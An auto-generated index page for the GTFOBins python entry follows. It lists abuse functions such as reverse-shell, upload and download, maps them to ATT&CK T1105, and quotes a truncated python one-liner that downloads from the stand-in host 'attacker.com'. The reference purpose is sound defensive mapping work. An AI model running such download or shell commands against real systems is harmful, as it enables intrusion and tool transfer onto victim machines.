---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# python

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `python` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for python covering download, file-read, file-write, library-load, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/python.md)
- Source verification: [source record](../../sources/gtfobins/python.md)

## Aliases

- `python`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve("http://attacker.com/path/to... |

## Source Verification

[source record](../../sources/gtfobins/python.md)

## Evidence Excerpt

```text
_body: ''
_name: python
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/python
comment: The payloads are compatible with both Python version 2 and 3.
functions:
download:
- code: 'python -c ''import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
```
